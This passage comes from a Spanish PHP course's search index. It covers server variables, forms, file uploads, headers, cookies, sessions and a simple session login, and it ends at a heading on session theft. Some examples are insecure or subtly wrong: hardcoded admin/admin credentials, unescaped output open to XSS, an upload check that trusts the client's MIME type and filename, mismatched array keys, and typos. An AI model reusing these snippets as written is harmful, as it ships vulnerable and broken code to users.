<li><code>$_POST</code>: par\u00e1metros enviados en el envio POST</li> <li><code>$_COOKIE</code>: contiene las cookies de la petici\u00f3n, las claves del array son los nombres de las cookies</li> <li><code>$_SERVER</code>: informaci\u00f3n sobre el servidor</li> <li><code>$_FILES</code>: informaci\u00f3n sobre los ficheros cargados via upload</li> </ul> <p>URL y URI</p> <p>Antes de continuar es necesario aclarar las diferencias entre URL y URI. La URL (Uniform Resource Locator) indica la localizaci\u00f3n donde se encuentran los recursos, mientras que la URI (Uniform Resource Identifier) identifica a un recurso en s\u00ed.  Diferencias entre URL y URI </p> <p>Si nos centramos en el array <code>$_SERVER</code> podemos consultar las siguientes propiedades:</p> <ul> <li><code>PHP_SELF</code>: nombre del script ejecutado, relativo al document root (p.ej: <code>/tienda/carrito.php</code>)</li> <li><code>SERVER_SOFTWARE</code>: (p.ej: Apache)</li> <li><code>SERVER_NAME</code>: dominio, alias DNS (p.ej: <code>www.elche.es</code>)</li> <li><code>REQUEST_METHOD</code>: GET</li> <li><code>REQUEST_URI</code>: URI, sin el dominio</li> <li><code>QUERY_STRING</code>: todo lo que va despu\u00e9s de <code>?</code> en la URL (p.ej: <code>heroe=Batman&amp;nombre=Bruce</code>)</li> </ul> <p>M\u00e1s informaci\u00f3n en https://www.php.net/manual/es/reserved.variables.server.php</p> <pre><code>&lt;?php\necho\u00a0$_SERVER[\"PHP_SELF\"].\"&lt;br&gt;\";\u00a0//\u00a0/u4/401server.php\necho\u00a0$_SERVER[\"SERVER_SOFTWARE\"].\"&lt;br&gt;\";\u00a0//\u00a0Apache/2.4.46\u00a0(Win64)\u00a0OpenSSL/1.1.1g\u00a0PHP/7.4.9\necho\u00a0$_SERVER[\"SERVER_NAME\"].\"&lt;br&gt;\";\u00a0//\u00a0localhost\n\necho\u00a0$_SERVER[\"REQUEST_METHOD\"].\"&lt;br&gt;\";\u00a0//\u00a0GET\necho\u00a0$_SERVER[\"REQUEST_URI\"].\"&lt;br&gt;\";\u00a0//\u00a0/u4/401server.php?heroe=Batman\necho\u00a0$_SERVER[\"QUERY_STRING\"].\"&lt;br&gt;\";\u00a0//\u00a0heroe=Batman\n</code></pre> <p>Otras propiedades relacionadas:</p> <ul> <li><code>PATH_INFO</code>: ruta extra tras la petici\u00f3n. Si la URL es <code>http://www.php.com/php/pathInfo.php/algo/cosa?foo=bar</code>, entonces <code>$_SERVER['PATH_INFO']</code> ser\u00e1 <code>/algo/cosa</code>.</li> <li><code>REMOTE_HOST</code>: hostname que hizo la petici\u00f3n</li> <li><code>REMOTE_ADDR</code>: IP del cliente</li> <li><code>AUTH_TYPE</code>: tipo de autenticaci\u00f3n (p.ej: Basic)</li> <li><code>REMOTE_USER</code>: nombre del usuario autenticado</li> </ul> <p>Apache crea una clave para cada cabecera HTTP, en may\u00fasculas y sustituyendo los guiones por subrayados:</p> <ul> <li><code>HTTP_USER_AGENT</code>: agente (navegador)</li> <li><code>HTTP_REFERER</code>: p\u00e1gina desde la que se hizo la petici\u00f3n</li> </ul> <pre><code>&lt;?php\necho\u00a0$_SERVER[\"HTTP_USER_AGENT\"].\"&lt;br&gt;\";\u00a0//\u00a0Mozilla/5.0\u00a0(Windows\u00a0NT\u00a010.0;\u00a0Win64;\u00a0x64)\u00a0AppleWebKit/537.36\u00a0(KHTML,\u00a0like\u00a0Gecko)\u00a0Chrome/87.0.4280.88\u00a0Safari/537.36\n</code></pre> Crear funci\u00f3n propia dd <p>En Laravel es bastante com\u00fan utilizar la funci\u00f3n dd --dump and die-- que muestra informaci\u00f3n de la variable pasada y corta la ejecuci\u00f3n del script actual. Muy \u00fatil para realizar depuraci\u00f3n y pruebas. </p> <p>Una implementaci\u00f3n propia de la funci\u00f3n ser\u00eda la siguiente:</p> <pre><code>&lt;?php\nfunction dd($value) {\n    echo \"&lt;pre&gt;\";\n    var_dump($value);\n    echo \"&lt;/pre&gt;\";\n    die();\n}\n\n// llamada con la supervariable $_SERVER\ndd($_SERVER);\n</code></pre>"},{"location":"04web.html#42-formularios","title":"4.2 Formularios","text":"<p>A la hora de enviar un formulario, debemos tener claro cuando usar GET o POST:</p> <ul> <li> <p>GET: los par\u00e1metros se pasan en la URL</p> <ul> <li>&lt;2048 caracteres, s\u00f3lo ASCII</li> <li>Permite almacenar en marcadores/historial la direcci\u00f3n completa</li> <li>Idempotente: dos llamadas con los mismos datos siempre debe dar el mismo resultado</li> <li>El navegador puede cachear las llamadas</li> </ul> </li> <li> <p>POST: par\u00e1metros ocultos (no encriptados)</p> <ul> <li>Sin l\u00edmite de datos, permite datos binarios</li> <li>No se pueden cachear</li> <li>No idempotente \u2192 actualizar la BBDD</li> </ul> </li> </ul> <p>As\u00ed pues, para recoger los datos accederemos al array dependiendo del m\u00e9todo del formulario que nos ha invocado:</p> <pre><code>&lt;?php\n$par = $_GET[\"parametro\"]\n$par = $_POST[\"parametro\"]\n</code></pre> <p>Para los siguientes apartados nos vamos a basar en el siguiente ejemplo:</p> <pre><code>&lt;form action=\"formulario.php\" method=\"POST\"&gt;\n    &lt;p&gt;&lt;label for=\"nombre\"&gt;Nombre del alumno:&lt;/label&gt;\n        &lt;input type=\"text\" name=\"nombre\" id=\"nombre\" value=\"\" /&gt;\n    &lt;/p&gt;\n\n    &lt;p&gt;&lt;input type=\"checkbox\" name=\"modulos[]\" id=\"modulosDWES\" value=\"DWES\" /&gt;\n        &lt;label for=\"modulosDWES\"&gt;Desarrollo web en entorno servidor&lt;/label&gt;\n    &lt;/p&gt;\n\n    &lt;p&gt;&lt;input type=\"checkbox\" name=\"modulos[]\" id=\"modulosDWEC\" value=\"DWEC\" /&gt;\n        &lt;label for=\"modulosDWEC\"&gt;Desarrollo web en entorno cliente&lt;/label&gt;\n    &lt;/p&gt;\n\n    &lt;input type=\"submit\" value=\"Enviar\" name=\"enviar\" /&gt;\n&lt;/form&gt;\n</code></pre>"},{"location":"04web.html#validacion","title":"Validaci\u00f3n","text":"<p>Respecto a la validaci\u00f3n, es conveniente siempre hacer validaci\u00f3n doble:</p> <ul> <li>En el cliente mediante JS.</li> <li>En el servidor es conveniente volver a validar los datos antes de utilizarlos.</li> </ul> <pre><code>&lt;?php\nif\u00a0(isset($_POST[\"parametro\"]))\u00a0{\n\u00a0\u00a0\u00a0\u00a0$par\u00a0=\u00a0$_POST[\"parametro\"];\n\u00a0\u00a0\u00a0\u00a0//\u00a0comprobar\u00a0si\u00a0$par\u00a0tiene\u00a0el\u00a0formato\u00a0adecuado,\u00a0su\u00a0valor,\u00a0etc...\n}\n</code></pre> <p>Librer\u00edas de validaci\u00f3n</p> <p>Existen diversas librer\u00edas que facilitan la validaci\u00f3n de los formularios, como son respect/validation o particle/validator.</p> <p>Cuando estudiemos Laravel profundizaremos en la validaci\u00f3n de forma declarativa.</p> <p>Mientras, recuerda que tienes funciones como gettype que devuelve el tipo de dato y otras como is_int, is_float, is_string, is_array, is_object, que devuelven un booleano a partir del tipo recibido.</p>"},{"location":"04web.html#parametro-multivalor","title":"Par\u00e1metro multivalor","text":"<p>Existen elementos HTML que env\u00edan varios valores:</p> <ul> <li><code>select multiple</code></li> <li><code>checkbox</code></li> </ul> <p>Para recoger los datos, el nombre del elemento debe ser un array. Esto tambi\u00e9n funciona con otro tipo de inputs, como los de texto, para recoger as\u00ed todos los valores en un mismo array.</p> <pre><code>&lt;select name=\"lenguajes[]\" multiple=\"true\"&gt;\n    &lt;option value=\"c\"&gt;C&lt;/option&gt;\n    &lt;option value=\"java\"&gt;Java&lt;/option&gt;\n    &lt;option value=\"php\"&gt;PHP&lt;/option&gt;\n    &lt;option value=\"python\"&gt;Python&lt;/option&gt;\n&lt;/select&gt;\n\n&lt;input type=\"checkbox\" name=\"lenguajes[]\" value=\"c\" /&gt; C&lt;br /&gt;\n&lt;input type=\"checkbox\" name=\"lenguajes[]\" value=\"java\" /&gt; Java&lt;br /&gt;\n&lt;input type=\"checkbox\" name=\"lenguajes[]\" value=\"php\" /&gt; Php&lt;br /&gt;\n&lt;input type=\"checkbox\" name=\"lenguajes[]\" value=\"python\" /&gt; Python&lt;br /&gt;\n</code></pre> <p>De manera que luego al recoger los datos:</p> <pre><code>&lt;?php\n$lenguajes = $_POST[\"lenguajes\"];\n\nforeach ($lenguajes as $lenguaje) {\n    echo \"$lenguaje &lt;br /&gt;\";\n}\n</code></pre>"},{"location":"04web.html#volver-a-rellenar-un-formulario","title":"Volver a rellenar un formulario","text":"<p>Si no pasa la validaci\u00f3n y el usuario tiene que volver a rellenar el formulario, lo ideal es mantener los campos correctos con la informaci\u00f3n que rellen\u00f3. Esta t\u00e9cnica recibe el nombre de sticky form: un formulario que recuerda sus valores. Para ello, hemos de rellenar los atributos <code>value</code> de los elementos HTML con la informaci\u00f3n que conten\u00edan:</p> <pre><code>&lt;?php\nif (!empty($_POST['modulos']) &amp;&amp; !empty($_POST['nombre'])) {\n  // Aqu\u00ed se incluye el c\u00f3digo a ejecutar cuando los datos son correctos\n} else {\n  // Generamos el formulario\n  $nombre = $_POST['nombre'] ?? \"\";\n  $modulos = $_POST['modulos'] ?? [];\n  ?&gt;\n  &lt;form action=\"&lt;?php echo $_SERVER['PHP_SELF'];?&gt;\" method=\"POST\"&gt;\n   &lt;p&gt;&lt;label for=\"nombre\"&gt;Nombre del alumno:&lt;/label&gt;\n    &lt;input type=\"text\" name=\"nombre\" id=\"nombre\" value=\"&lt;?= $nombre ?&gt;\" /&gt; \n   &lt;/p&gt;\n   &lt;p&gt;&lt;input type=\"checkbox\" name=\"modulos[]\" id=\"modulosDWES\" value=\"DWES\"\n    &lt;?php if(in_array(\"DWES\",$modulos)) echo 'checked=\"checked\"'; ?&gt; /&gt;\n    &lt;label for=\"modulosDWES\"&gt;Desarrollo web en entorno servidor&lt;/label&gt;\n   &lt;/p&gt;\n   &lt;p&gt;&lt;input type=\"checkbox\" name=\"modulos[]\" id=\"modulosDWEC\" value=\"DWEC\"\n    &lt;?php if(in_array(\"DWEC\",$modulos)) echo 'checked=\"checked\"'; ?&gt; /&gt;\n    &lt;label for=\"modulosDWEC\"&gt;Desarrollo web en entorno cliente&lt;/label&gt;\n   &lt;/p&gt;\n   &lt;input type=\"submit\" value=\"Enviar\" name=\"enviar\"/&gt;\n  &lt;/form&gt;\n&lt;?php } ?&gt;\n</code></pre>"},{"location":"04web.html#subir-archivos","title":"Subir archivos","text":"<p>Cuando subamos archivos a trav\u00e9s de un formulario es imprescindible utilizar utilizar los atributos <code>method=\"POST\"</code> y <code>enctype=\"multipart/form-data\"</code>.</p> <pre><code>&lt;form enctype=\"multipart/form-data\" method=\"POST\" action=\"&lt;?php echo $_SERVER['PHP_SELF']; ?&gt;\"&gt;\n    Archivo: &lt;input name=\"archivoEnviado\" type=\"file\" /&gt;\n    &lt;br /&gt;\n    &lt;input type=\"submit\" name=\"btnSubir\" value=\"Subir\" /&gt;\n&lt;/form&gt;\n</code></pre> <p>Configuraci\u00f3n en <code>php.ini</code></p> <ul> <li><code>file_uploads</code>: on / off</li> <li><code>upload_max_filesize</code>: 2M</li> <li><code>upload_tmp_dir</code>: directorio temporal. No es necesario configurarlo, coger\u00e1 el predeterminado del sistema</li> <li><code>post_max_size</code>: tama\u00f1o m\u00e1ximo de los datos POST. Debe ser mayor a upload_max_filesize.</li> <li><code>max_file_uploads</code>: n\u00famero m\u00e1ximo de archivos que se pueden cargar a la vez.</li> <li><code>max_input_time</code>: tiempo m\u00e1ximo empleado en la carga (GET/POST y upload \u2192 normalmente se configura en 60)</li> <li><code>memory_limit</code>: 128M</li> <li><code>max_execution_time</code>: tiempo de ejecuci\u00f3n de un script (no tiene en cuenta el upload)</li> </ul> <p>Consultar las directivas del php.ini</p> <p>Mediante la funci\u00f3n ini_get podemos obtener el valor de cualquiera directiva del fichero <code>php.ini</code>. Por ejemplo, para consultar cu\u00e1l es el directorio temporal al que se suben los archivos bastar\u00eda con: <code>echo ini_get(\"upload_tmp_dir\");</code>.</p> <p>Y mediante ini_set podemos modificarlas para que tenga efecto su nuevo valor durante la ejecuci\u00f3n del script actual. Despu\u00e9s volver\u00e1n al valor del fichero <code>php.ini</code>. Por ejemplo: <code>ini_set(\"upload_tmp_dir\", \"/uploads\")</code>.</p> <p>Una vez enviado el formulario, el proceso es siempre el mismo:</p> <ol> <li>Comprobar que el archivo se ha subido correctamente.</li> <li>Validar el archivo (tipo, tama\u00f1o...).</li> <li>Crear ruta destino y nombre de archivo seg\u00fan nuestros intereses (utilizar id del usuario, c\u00f3digo \u00fanico...).</li> <li>Mover el archivo del directorio temporal a la ruta de destino.</li> </ol> <p>Para todo ello, podemos acceder a la informaci\u00f3n de los archivos subidos desde el array asociativo <code>$_FILES</code>. A cada archivo se accede por clave \u2192 el nombre que se le di\u00f3 en su atributo <code>name</code> del input. Y a su vez, para cada archivo se tiene:</p> <ul> <li><code>name</code>: nombre</li> <li><code>tmp_name</code>: ruta temporal</li> <li><code>size</code>: tama\u00f1o en bytes</li> <li><code>type</code>: tipo MIME </li> <li><code>error</code>: si hay error, contiene un mensaje. Si ok \u2192 0.</li> </ul> <p>Ejemplo de c\u00f3mo procesar un archivo subido al sevidor:</p> <pre><code>&lt;?php\nif (isset($_POST['btnSubir'])) {\n    // 1. Comprobar que el archivo se sube correctamente\n    if (is_uploaded_file($_FILES['archivoEnviado']['tmp_name'])) {\n        // 2. Realizar validaci\u00f3n\n        if($_FILES['archivoEnviado']['type'] == \"image/jpeg\"){\n            $tmp = $_FILES['foto']['tmp_name'];\n            // 3. Crear ruta destino con nombre, en este caso el original\n            $destino = __DIR__ . \"/uploads/\" . $_FILES['foto']['name']; \n            // __DIR__ es una constante m\u00e1gica de PHP que devuelve la ruta absoluta del directorio donde se encuentra el archivo PHP que se est\u00e1 ejecutando\n            // $destino = \"./uploads/\" . $_FILES['foto']['name']; // Alternativa mediante ruta relativa\n\n            // 4. Mover el archivo del directorio temporal al definitivo\n            move_uploaded_file($tmp, $destino);\n        }\n    }\n}\n</code></pre> <p>Permisos en ruta destino</p> <p>Muy importante, la carpeta destino de los archivos subidos ('uploads' en el ejemplo anterior), tiene que tener permisos de escritura para que el servidor web pueda mover los archivos a \u00e9l.</p> <p>Obtener extensi\u00f3n del fichero</p> <p>Mediante la funci\u00f3n pathinfo se obtiene un array con informaci\u00f3n del fichero. Entre ellos, la extensi\u00f3n del mismo.</p>"},{"location":"04web.html#43-cabeceras-de-respuesta","title":"4.3 Cabeceras de respuesta","text":"<p>Debe ser lo primero a devolver. Se devuelven mediante la funci\u00f3n <code>header(cadena)</code>. Mediante las cabeceras podemos configurar el tipo de contenido, tiempo de expiraci\u00f3n, redireccionar el navegador, especificar errores HTTP, etc.</p> <pre><code>&lt;?php header(\"Content-Type: text/plain\"); ?&gt;\n&lt;?php header(\"Location: http://www.ejemplo.com/inicio.html\");\nexit(); \n</code></pre> <p>Se puede comprobar en las herramientas del desarrollador de los navegadores web mediante Dev Tools \u2192 Red \u2192 clic en el nombre del archivo \u2192 Encabezados.</p> <p>Es muy com\u00fan configurar las cabeceras para evitar consultas a la cach\u00e9 o provocar su renovaci\u00f3n:</p> <pre><code>&lt;?php\nheader(\"Expires: Sun, 31 Jan 2021 23:59:59 GMT\");\n// tres horas\n$now = time();\n$horas3 = gmstrftime(\"%a, %d %b %Y %H:%M:%S GMT\", $now + 60 * 60 * 3);\nheader(\"Expires: {$horas3}\");\n// un a\u00f1o\n$now = time();\n$anyo1 = gmstrftime(\"%a, %d %b %Y %H:%M:%S GMT\", $now + 365 * 86440);\nheader(\"Expires: {$anyo1}\");\n// se marca como expirado (fecha en el pasado)\n$pasado = gmstrftime(\"%a, %d %b %Y %H:%M:%S GMT\");\nheader(\"Expires: {$pasado}\");\n// evitamos cache de navegador y/o proxy\nheader(\"Expires: Mon, 26 Jul 1997 05:00:00 GMT\");\nheader(\"Last-Modified: \" . gmdate(\"D, d M Y H:i:s\") . \" GMT\");\nheader(\"Cache-Control: no-store, no-cache, must-revalidate\");\nheader(\"Cache-Control: post-check=0, pre-check=0\", false);\nheader(\"Pragma: no-cache\");\n</code></pre>"},{"location":"04web.html#44-gestion-del-estado","title":"4.4 Gesti\u00f3n del estado","text":"<p>HTTP es un protocolo stateless, sin estado. Por ello, se simula el estado mediante el uso de cookies, tokens o la sesi\u00f3n. El estado es necesario para procesos tales como el carrito de la compra, operaciones asociadas a un usuario, etc... El mecanismo de PHP para gestionar la sesi\u00f3n emplea cookies de forma interna. Las cookies se almacenan en el navegador del cliente, y la sesi\u00f3n en el servidor web.</p>"},{"location":"04web.html#cookies","title":"Cookies","text":"<p>Las cookies se almacenan en el array global <code>$_COOKIE</code>. Lo que coloquemos dentro del array, se guardar\u00e1 en el cliente. Hay que tener presente que el cliente puede no querer almacenarlas. </p> <p>Existe una limitaci\u00f3n de 20 cookies por dominio y 300 en total en el navegador.</p> <p>En PHP, para crear una cookie se utiliza la funci\u00f3n <code>setcookie</code>:</p> <pre><code>&lt;?php\nsetcookie(nombre [, valor [, expira [, ruta [, dominio [, seguro [, httponly ]]]]]]);\nsetcookie(nombre [, valor = \"\" [, opciones = [] ]] )\n?&gt;\n</code></pre> <p>Destacar que el nombre no puede contener espacios ni el caracter <code>;</code>. Respecto al contenido de la cookie, no puede superar los 4 KB.</p> <p>Por ejemplo, mediante cookies podemos comprobar la cantidad de visitas diferentes que realiza un usuario:</p> <pre><code>&lt;?php\n$accesosPagina\u00a0=\u00a00;\nif\u00a0(isset($_COOKIE['accesos']))\u00a0{\u00a0\n    $accesosPagina\u00a0=\u00a0$_COOKIE['accesos']; // recuperamos una cookie\n    setcookie('accesos',\u00a0++$accesosPagina); // le asignamos un valor\n}\n?&gt;\n</code></pre> <p>Inspeccionando las cookies</p> <p>Si queremos ver que contienen las cookies que tenemos almacenadas en el navegador, se puede comprobar su valor en Dev Tools \u2192 Aplicaci\u00f3n \u2192 Almacenamiento</p> <p>El tiempo de vida de las cookies puede ser tan largo como el sitio web en el que residen. Ellas seguir\u00e1n ah\u00ed, incluso si el navegador est\u00e1 cerrado o abierto.</p> <p>Para borrar una cookie se puede poner que expiren en el pasado:</p> <pre><code>&lt;?php\nsetcookie(nombre,\u00a0\"\",\u00a01) // pasado\n</code></pre> <p>O que caduquen dentro de un periodo de tiempo deteminado:</p> <pre><code>&lt;?php\nsetcookie(nombre,\u00a0valor,\u00a0time() + 3600) // Caducan dentro de una hora\n</code></pre> Comunicaci\u00f3n con cookies <p>Se utilizan para:</p> <ul> <li>Recordar los inicios de sesi\u00f3n</li> <li>Almacenar valores temporales de usuario</li> <li>Si un usuario est\u00e1 navegando por una lista paginada de art\u00edculos, ordenados de cierta manera, podemos almacenar el ajuste de la clasificaci\u00f3n.</li> </ul> <p>La alternativa en el cliente para almacenar informaci\u00f3n en el navegador es el objeto LocalStorage.</p>"},{"location":"04web.html#sesion","title":"Sesi\u00f3n","text":"<p>La sesi\u00f3n a\u00f1ade la gesti\u00f3n del estado a HTTP, almacenando la informaci\u00f3n en el servidor. Cada visitante tiene un ID de sesi\u00f3n \u00fanico, el cual por defecto se almacena en una cookie denominada <code>PHPSESSID</code> que se crea una vez se inicia la sesi\u00f3n mediante <code>session_start()</code>.</p> <p>Si el cliente no tiene las cookies activas, el ID se propaga en cada URL dentro del mismo dominio. Cada sesi\u00f3n tiene asociado un almac\u00e9n de datos mediante el array global <code>$_SESSION</code>, en el cual podemos almacenar y recuperar informaci\u00f3n.</p> <p>La sesi\u00f3n comienza al ejecutar un script PHP. Se genera un nuevo ID y se cargan los datos del almac\u00e9n:</p> Comunicaci\u00f3n con sesi\u00f3n <p>Las operaciones que podemos realizar con la sesi\u00f3n son:</p> <pre><code>&lt;?php\nsession_start(); // carga la sesi\u00f3n\necho session_id(); // devuelve el id\n$_SESSION[clave] = valor; // inserci\u00f3n\nsession_destroy(); // destruye la sesi\u00f3n\nunset($_SESSION[clave]); // borrado\nsession_unset(); // borra todas las variables de la sesi\u00f3n\n</code></pre> <p>Destruir la sesi\u00f3n y sus variables</p> <p>Al hacer <code>session_destroy()</code> se destruye toda la informaci\u00f3n asociada con la sesi\u00f3n actual, pero no destruye ninguna de las variables globales asociadas con la sesi\u00f3n, ni destruye la cookie de sesi\u00f3n. Para liberar todas las variables de la sesi\u00f3n, utilizar antes <code>session_unset()</code>.</p> <p>Vamos a ver mediante un ejemplo como podemos insertar en un p\u00e1gina datos en la sesi\u00f3n para posteriormente en otra p\u00e1gina acceder a esos datos. Por ejemplo, en <code>sesion1.php</code> tendr\u00edamos</p> <pre><code>&lt;?php\nsession_start();\u00a0//\u00a0inicializamos\n$_SESSION[\"ies\"]\u00a0=\u00a0\"IES\u00a0Fernando III\";\u00a0//\u00a0asignaci\u00f3n\n$instituto\u00a0=\u00a0$_SESSION[\"ies\"];\u00a0//\u00a0recuperaci\u00f3n\necho\u00a0\"Estamos\u00a0en\u00a0el\u00a0$instituto\u00a0\";\n?&gt;\n&lt;br\u00a0/&gt;\n&lt;a\u00a0href=\"sesion2.php\"&gt;Y\u00a0luego&lt;/a&gt;\n</code></pre> <p>Y posteriormente podemos acceder a la sesi\u00f3n en <code>sesion2.php</code>:</p> <pre><code>&lt;?php\nsession_start();\n$instituto\u00a0=\u00a0$_SESSION[\"ies\"];\u00a0//\u00a0recuperaci\u00f3n\necho\u00a0\"Otra\u00a0vez,\u00a0en\u00a0el\u00a0$instituto\u00a0\";\n?&gt;\n</code></pre> <p>Configurando la sesi\u00f3n en <code>php.ini</code></p> <p>Las siguiente propiedades de <code>php.ini</code> permiten configurar algunos aspectos de la sesi\u00f3n:</p> <ul> <li><code>session.save_handler</code>: controlador que gestiona c\u00f3mo se almacena (<code>files</code>)</li> <li><code>session.save_path</code>: ruta donde se almacenan los archivos con los datos (si tenemos un cluster, podr\u00edamos usar <code>/mnt/sessions</code> en todos los servidor de manera que apuntan a una carpeta compartida)</li> <li><code>session.name</code>: nombre de la sesi\u00f3n (<code>PHPSESSID</code>)</li> <li><code>session.auto_start</code>: Se puede hacer que se autocargue con cada script. Por defecto est\u00e1 deshabilitado</li> <li><code>session.cookie_lifetime</code>: tiempo de vida por defecto</li> </ul> <p>M\u00e1s informaci\u00f3n en la documentaci\u00f3n oficial.</p>"},{"location":"04web.html#45-autentificacion-de-usuarios","title":"4.5 Autentificaci\u00f3n de usuarios","text":""},{"location":"04web.html#basada-en-sesiones","title":"Basada en sesiones","text":"<p>Una sesi\u00f3n establece una relaci\u00f3n an\u00f3nima con un usuario particular, de manera que podemos saber si es el mismo usuario entre dos peticiones distintas. Si preparamos un sistema de login, podremos saber qui\u00e9n utiliza nuestra aplicaci\u00f3n.</p> <p>Para ello, preparemos un sencillo sistema de autenticaci\u00f3n:</p> <ul> <li>Mostrar el formulario login/password</li> <li>Comprobar los datos enviados</li> <li>A\u00f1adir el login a la sesi\u00f3n</li> <li>Comprobar el login en la sesi\u00f3n para realizar tareas espec\u00edficas del usuario</li> <li>Eliminar el login de la sesi\u00f3n cuando el usuario la cierra.</li> </ul> <p>Vamos a ver en c\u00f3digo cada paso del proceso. Comenzamos con el archivo <code>index.php</code>:</p> <pre><code>&lt;form action='login.php' method='post'&gt;\n  &lt;fieldset&gt;\n    &lt;legend&gt;Login&lt;/legend&gt;\n    &lt;div&gt;&lt;span class='error'&gt;&lt;?php echo $error; ?&gt;&lt;/span&gt;&lt;/div&gt;\n    &lt;div class='fila'&gt;\n        &lt;label for='usuario'&gt;Usuario:&lt;/label&gt;&lt;br /&gt;\n        &lt;input type='text' name='inputUsuario' id='usuario' maxlength=\"50\" /&gt;&lt;br /&gt;\n    &lt;/div&gt;\n    &lt;div class='fila'&gt;\n        &lt;label for='password'&gt;Contrase\u00f1a:&lt;/label&gt;&lt;br /&gt;\n        &lt;input type='password' name='inputPassword' id='password' maxlength=\"50\" /&gt;&lt;br /&gt;\n    &lt;/div&gt;\n    &lt;div class='fila'&gt;\n        &lt;input type='submit' name='enviar' value='Enviar' /&gt;\n    &lt;/div&gt;\n  &lt;/fieldset&gt;\n&lt;/form&gt;\n</code></pre> <p>Al hacer submit nos lleva a <code>login.php</code>, el cual hace de controlador:</p> <pre><code>&lt;?php\n// Comprobamos si ya se ha enviado el formulario\nif (isset($_POST['enviar'])) {\n    $usuario = $_POST['inputUsuario'];\n    $password = $_POST['inputPassword'];\n\n    // validamos que recibimos ambos par\u00e1metros\n    if (empty($usuario) || empty($password)) {\n        $error = \"Debes introducir un usuario y contrase\u00f1a\";\n        include \"index.php\";\n    } else {\n        if ($usuario == \"admin\" &amp;&amp; $password == \"admin\") {\n            // almacenamos el usuario en la sesi\u00f3n\n            session_start();\n            $_SESSION['usuario'] = $usuario;\n            // cargamos la p\u00e1gina principal\n            include \"main.php\";\n        } else {\n            // Si las credenciales no son v\u00e1lidas, se vuelven a pedir\n            $error = \"Usuario o contrase\u00f1a no v\u00e1lidos!\";\n            include \"index.php\";\n        }\n    }\n}\n</code></pre> <p>Dependiendo del usuario que se haya logueado, vamos a ir a una vista o a otra. Por ejemplo, en <code>main.php</code> tendr\u00edamos:</p> <pre><code>&lt;?php\n    // Recuperamos la informaci\u00f3n de la sesi\u00f3n\n    if(!isset($_SESSION)) {\n        session_start();\n    }\n\n    // Y comprobamos que el usuario se haya autentificado\n    if (!isset($_SESSION['usuario'])) {\n        // die, al igual que exit escribe su mensaje y ya no ejecuta nada m\u00e1s del script\n        die(\"Error - debe &lt;a href='index.php'&gt;identificarse&lt;/a&gt;.&lt;br /&gt;\");\n    }\n?&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"es\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;Listado de productos&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;Bienvenido &lt;?= $_SESSION['usuario'] ?&gt;&lt;/h1&gt;\n    &lt;p&gt;Pulse &lt;a href=\"logout.php\"&gt;aqu\u00ed&lt;/a&gt; para salir&lt;/p&gt;\n    &lt;p&gt;Volver al &lt;a href=\"main.php\"&gt;inicio&lt;/a&gt;&lt;/p&gt;\n    &lt;h2&gt;Listado de productos&lt;/h2&gt;\n    &lt;ul&gt;\n        &lt;li&gt;Producto 1&lt;/li&gt;\n        &lt;li&gt;Producto 2&lt;/li&gt;\n        &lt;li&gt;Producto 3&lt;/li&gt;\n    &lt;/ul&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Finalmente, necesitamos la opci\u00f3n de cerrar la sesi\u00f3n que colocamos en <code>logout.php</code>:</p> <pre><code>&lt;?php\n// Recuperamos la informaci\u00f3n de la sesi\u00f3n\nsession_start();\n\n// Y la destruimos\nsession_unset();\nsession_destroy();\nheader(\"Location: index.php\");\n?&gt;\n</code></pre> <p>Autenticaci\u00f3n en producci\u00f3n</p> <p>En la actualidad la autenticaci\u00f3n de usuario no se realiza gestionando la sesi\u00f3n direcamente, sino que se realiza mediante alg\u00fan framekwork que abstrae todo el proceso o la integraci\u00f3n de mecanismos de autenticaci\u00f3n tipo OAuth, como  estudiaremos en la \u00faltima unidad mediante Laravel.</p>"},{"location":"04web.html#otros-mecanismos","title":"Otros mecanismos","text":"Mecanismo de Autenticaci\u00f3n Descripci\u00f3n Implementaci\u00f3n Seguridad Sesiones Utiliza sesiones del servidor para almacenar la informaci\u00f3n del usuario despu\u00e9s de iniciar sesi\u00f3n. Usa <code>$_SESSION</code> para almacenar y verificar los datos del usuario. Configura cookies con <code>HttpOnly</code> y <code>Secure</code>. Cookies (Recordar sesi\u00f3n) Permite al usuario permanecer conectado mediante un token almacenado en una cookie. Guarda un token hash en la cookie y verifica con la base de datos. Usa cookies seguras y renueva el token regularmente. JWT (JSON Web Token) Utiliza tokens sin estado para autenticar usuarios, ideal para APIs REST. Usa la biblioteca <code>firebase/php-jwt</code> para crear y validar tokens. Configura tiempos de expiraci\u00f3n cortos y almacena tokens de refresco. OAuth (Redes sociales) Permite iniciar sesi\u00f3n con cuentas de Google, Facebook, GitHub, etc. Usa bibliotecas como <code>PHPoAuthLib</code> o las APIs de las redes sociales. Valida siempre los datos recibidos del proveedor de OAuth. Autenticaci\u00f3n de dos factores (2FA) Requiere una contrase\u00f1a y un c\u00f3digo adicional (enviado al correo o tel\u00e9fono). Usa bibliotecas como <code>Google Authenticator</code> para generar c\u00f3digos TOTP o podemos utilizar un aleatorio propio. Proporciona alta seguridad, aunque requiere m\u00e1s gesti\u00f3n. Enlaces m\u00e1gicos (Magic Links) El usuario recibe un enlace de un solo uso por correo electr\u00f3nico para iniciar sesi\u00f3n. Genera un token de un solo uso y env\u00edalo por correo. Expira r\u00e1pidamente y se usa solo una vez. IP y User-Agent Autentica al usuario teniendo en cuenta la IP y el User-Agent del navegador. Usa <code>$_SERVER['REMOTE_ADDR']</code> y <code>$_SERVER['HTTP_USER_AGENT']</code>. Puede mejorar la seguridad, pero es menos confiable. Biom\u00e9trica Utiliza datos biom\u00e9tricos como huellas digitales o reconocimiento facial. Se implementa generalmente en aplicaciones m\u00f3viles, con PHP manejando los datos en el backend. Altamente seguro, pero depende del soporte del dispositivo. CAPTCHA Protege el formulario de inicio de sesi\u00f3n de bots y ataques de fuerza bruta. Usa <code>Google reCAPTCHA</code> para validar la autenticidad del usuario. Buena medida adicional para formularios p\u00fablicos."},{"location":"04web.html#robos-de-sesion","title":"Robos de sesi\u00f3n","text":"<p>A continuaci\u00f3n, se describen algunos m\u00e9todos comunes utilizados para robar la sesi\u00f3n de un usuario, junto con las contramedidas necesarias para evitar estos ataques. </p>"},{"location":"04web.html#1-ataque-de-cross-site-scripting-xss","title":"1. Ataque de Cross-Site Scripting 